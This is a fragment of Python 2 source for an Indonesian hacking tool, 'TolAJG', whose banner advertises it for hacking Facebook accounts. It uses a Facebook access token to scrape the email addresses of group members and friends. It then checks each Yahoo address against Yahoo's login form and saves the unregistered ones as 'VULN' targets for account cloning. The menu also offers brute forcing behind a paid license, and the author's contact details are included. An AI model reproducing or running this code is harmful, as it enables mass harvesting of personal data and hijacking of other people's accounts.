                br.select_form(nr=0)
                br['username'] = mail
                klik = br.submit().read()
                jok = re.compile('"messages.ERROR_INVALID_USERNAME">.*')
                try:
                    pek = jok.search(klik).group()
                except:
                    continue

                if '"messages.ERROR_INVALID_USERNAME">' in pek:
                    save.write(mail + '\n')
                    print '\x1b[1;97m[ \x1b[1;92mVULN\x1b[1;97m ] \x1b[1;97m[~>\x1b[1;92m' + mail + ' \x1b[1;97m[~>' + nama
                    berhasil.append(mail)
        except KeyError:
            pass

    print 42 * '\x1b[1;96m\xe2\x95\x90'
    print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;96mFinish \x1b[1;97m....'
    print '\x1b[1;91m[+] \x1b[1;96mTotal \x1b[1;91m: \x1b[1;97m' + str(len(berhasil))
    print '\x1b[1;91m[+] \x1b[1;96mFile saved \x1b[1;91m:\x1b[1;97m ajg/FriendMailVuln.txt'
    save.close()
    raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
    menu_yahoo()


def yahoomember():
    global toket
    os.system('reset')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.mkdir('ajg')
        except OSError:
            pass

        os.system('reset')
        run('\n\t     \x1b[41;1;33m[      Info Tools     ]\x1b[0;0m\n\x1b[1;91m _____     _    _       _  ____\n|_   _|__ | |  / \\     | |/ ___|\n  | |/ _ \\| | / _ \\ _  | | |  _\n\x1b[1;97m  | | (_) | |/ ___ \\ |_| | |_| |\n  |_|\\___/|_/_/   \\_\\___/ \\____|\x1b[1;93m v2.0\n\x1b[1;96m\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\n\x1b[1;97m   [\x1b[1;92m\xe2\x9c\xa6\x1b[1;97m] \x1b[1;93mAuthor \x1b[1;97m: \x1b[1;91mMaestro\n\x1b[1;97m   [\x1b[1;92m\xe2\x9c\xa6\x1b[1;97m] \x1b[1;93mSupport\x1b[1;97m: \x1b[1;91mAnonymous\n\x1b[1;97m   [\x1b[1;92m\xe2\x9c\xa6\x1b[1;97m] \x1b[1;93mVersion\x1b[1;97m: \x1b[1;91mTolAJGv2.0.0\n\x1b[1;97m   [\x1b[1;92m\xe2\x9c\xa6\x1b[1;97m] \x1b[1;93mGithub \x1b[1;97m: \x1b[1;91mGithub.com/Maestro-Alvardo\n\x1b[1;96m \t\t\t \xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\x1b[1;97m\n')
        run('\x1b[1;91m+\x1b[1;92m---------------------------------------------------\x1b[1;91m+')
        run('\x1b[1;91m+\x1b[1;96m       TolAJGv1.0 For Hacking Facebook Account     \x1b[1;91m+')
        run("\x1b[1;91m+ \x1b[1;96m      it's Work.                                  \x1b[1;91m+")
        run('\x1b[1;91m+\x1b[1;92m---------------------------------------------------\x1b[1;91m+')
        mpsh = []
        jml = 0
        id = raw_input('\x1b[1;91m[+] \x1b[1;96mInput ID group \x1b[1;91m:\x1b[1;97m ')
        try:
            r = requests.get('https://graph.facebook.com/group/?id=' + id + '&access_token=' + toket)
            asw = json.loads(r.text)
            print '\x1b[1;91m[\x1b[1;92m\xe2\x9c\x93\x1b[1;91m] \x1b[1;96mFrom group \x1b[1;91m:\x1b[1;97m ' + asw['name']
        except KeyError:
            print '\x1b[1;91m[!] Group not found'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            menu_yahoo()

    teman = requests.get('https://graph.facebook.com/' + id + '/members?fields=name,id&limit=999999999&access_token=' + toket)
    kimak = json.loads(teman.text)
    save = open('ajg/GrupMailVuln.txt', 'w')
    print 42 * '\x1b[1;96m\xe2\x95\x90'
    for w in kimak['data']:
        jml += 1
        mpsh.append(jml)
        id = w['id']
        nama = w['name']
        links = requests.get('https://graph.facebook.com/' + id + '?access_token=' + toket)
        z = json.loads(links.text)
        try:
            mail = z['email']
            yahoo = re.compile('@.*')
            otw = yahoo.search(mail).group()
            if 'yahoo.com' in otw:
                br.open('https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com')
                br._factory.is_html = True
                br.select_form(nr=0)
                br['username'] = mail
                klik = br.submit().read()
                jok = re.compile('"messages.ERROR_INVALID_USERNAME">.*')
                try:
                    pek = jok.search(klik).group()
                except:
                    continue

                if '"messages.ERROR_INVALID_USERNAME">' in pek:
                    save.write(mail + '\n')
                    print '\x1b[1;97m[ \x1b[1;92mVULN\x1b[1;97m ] \x1b[1;97m[~>\x1b[1;92m' + mail + ' \x1b[1;97m[~>' + nama
                    berhasil.append(mail)
        except KeyError:
            pass

    print 42 * '\x1b[1;96m\xe2\x95\x90'
    print '\x1b[1;91m[\x1b[1;92m\xe2\x9c\x93\x1b[1;91m] \x1b[1;96mFinish \x1b[1;97m....'
    print '\x1b[1;91m[+] \x1b[1;96mTotal \x1b[1;91m: \x1b[1;97m' + str(len(berhasil))
    print '\x1b[1;91m[+] \x1b[1;96mFile saved \x1b[1;91m:\x1b[1;97m ajg/GrupMailVuln.txt'
    save.close()
    raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
    menu_yahoo()


def cadmin():
    os.system('reset')
    run('\n\tWhatsApp : +6281360479719\n\tGmail : maestroalvardo@gmail.com\n\tYouTube : Maestro _A\n\tYang lain : -\n\t')
    raw_input('Enter to Menu')
    sapa()


def rbug():
    os.system('reset')
    run('\n\t\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\n\t\xe2\x95\x91Laporkan BUG akan mendapatkan 10k Pulsa\n\t\xe2\x95\x91Jelaskan Jenis BUG nya Seperti:\n\t\xe2\x95\x91~Login Selalu Gagal\n\t\xe2\x95\x91~Tampilan BUG/Rusak\n\t\xe2\x95\x91~Fitur tidak Berfungsi\n\t\xe2\x95\x91~Dll...\n\t\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\n\t')
    run("[!]ATTENTION : Gunakan '+' untuk spasi atau '20%'")
    send = raw_input('[!]Jelaskan BUG nya : ')
    os.system('xdg-open https://api.whatsapp.com/send?phone=6281360479719&text=' + send)
    keluar()


def trial():
    os.system('reset')
    run('\n\t     \x1b[41;1;33m[      Info Tools     ]\x1b[0;0m\n\x1b[1;91m _____     _    _       _  ____\n|_   _|__ | |  / \\     | |/ ___|\n  | |/ _ \\| | / _ \\ _  | | |  _\n\x1b[1;97m  | | (_) | |/ ___ \\ |_| | |_| |\n  |_|\\___/|_/_/   \\_\\___/ \\____|\x1b[1;93m v2.0\n\x1b[1;96m\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\n\x1b[1;97m   [\x1b[1;92m\xe2\x9c\xa6\x1b[1;97m] \x1b[1;93mAuthor \x1b[1;97m: \x1b[1;91mMaestro\n\x1b[1;97m   [\x1b[1;92m\xe2\x9c\xa6\x1b[1;97m] \x1b[1;93mSupport\x1b[1;97m: \x1b[1;91mAnonymous\n\x1b[1;97m   [\x1b[1;92m\xe2\x9c\xa6\x1b[1;97m] \x1b[1;93mVersion\x1b[1;97m: \x1b[1;91mTolAJGv2.0.0\n\x1b[1;97m   [\x1b[1;92m\xe2\x9c\xa6\x1b[1;97m] \x1b[1;93mGithub \x1b[1;97m: \x1b[1;91mGithub.com/Maestro-Alvardo\n\x1b[1;96m \t\t\t \xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\x1b[1;97m\n')
    run('\x1b[1;91m+\x1b[1;92m---------------------------------------------------\x1b[1;91m+')
    run('\x1b[1;91m+\x1b[1;96m       TolAJGv1.0 For Hacking Facebook Account     \x1b[1;91m+')
    run("\x1b[1;91m+ \x1b[1;96m      it's Work.                                  \x1b[1;91m+")
    run('\x1b[1;91m+\x1b[1;92m---------------------------------------------------\x1b[1;91m+')
    run('\x1b[1;97m-----------------------------------------------------')
    run('\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m]\x1b[1;91mYour Information')
    run('\x1b[1;91m[\x1b[1;93m+\x1b[1;91m]\x1b[1;96mName\x1b[1;97m :\x1b[1;97m Anonim')
    run('\x1b[1;91m[\x1b[1;93m+\x1b[1;91m]\x1b[1;96mID\x1b[1;97m   :\x1b[1;97m 12345678901234')
    run('\x1b[1;91m[\x1b[1;93m+\x1b[1;91m]\x1b[1;96mList \x1b[1;97m: \x1b[1;97mTrial Password')
    run('\x1b[1;97m-----------------------------------------------------')
    run('\x1b[1;97m-----------------------------------------------------')
    run('\x1b[1;92m       Sorry in no real Password')
    run('\x1b[1;92m     Please Buy or Contact Author')
    run('\x1b[1;92m        For Get Real Password! ')
    run('\x1b[1;97m-----------------------------------------------------')
    run('                                              \x1b[1;96m[\x1b[1;91m\xe2\x80\xa2\x1b[1;96m]\x1b[1;91mMenu')
    run('\x1b[1;97m[\x1b[1;96m1.\x1b[1;97m]\x1b[1;92mDump ID')
    run('\x1b[1;97m[\x1b[1;96m2.\x1b[1;97m]\x1b[1;92mAuto ButeForce')
    run('\x1b[1;97m[\x1b[1;96m3.\x1b[1;97m]\x1b[1;92mSuper Hack Facebook')
    run('\x1b[1;97m[\x1b[1;96m4.\x1b[1;97m]\x1b[1;92mYahoo Cloning')
    run('\x1b[1;97m[\x1b[1;96m77\x1b[1;97m]\x1b[1;93mContact Admin')
    run('\x1b[1;97m[\x1b[1;96m97\x1b[1;97m]\x1b[1;91mReport BUG')
    run('\x1b[1;97m[\x1b[1;91m00\x1b[1;97m]\x1b[1;97mExit')
    asw()


def asw():
    asu = raw_input('[\xe2\x80\xa2 TolAJG \xe2\x80\xa2] : ')
    if asu == '':
        print 'Lol'
        asw()
    elif asu == '1':
        run('Please Buy Lisensi For Open in Tools ')
        asw()
    elif asu == '2':
        run('Please Buy Lisensi For Open in Tools ')
        asw()
    elif asu == '3':
        run('Please Buy Lisensi For Open in Tools ')
        asw()
    elif asu == '4':
        run('Please Buy Lisensi For Open in Tools ')
        asw()
    elif asu == '77':
        cadmin()
    elif asu == '97':
        rbug()
    elif asu == '00':
        keluar()
    else:
        print 'Lol'
        asw()


sapa()
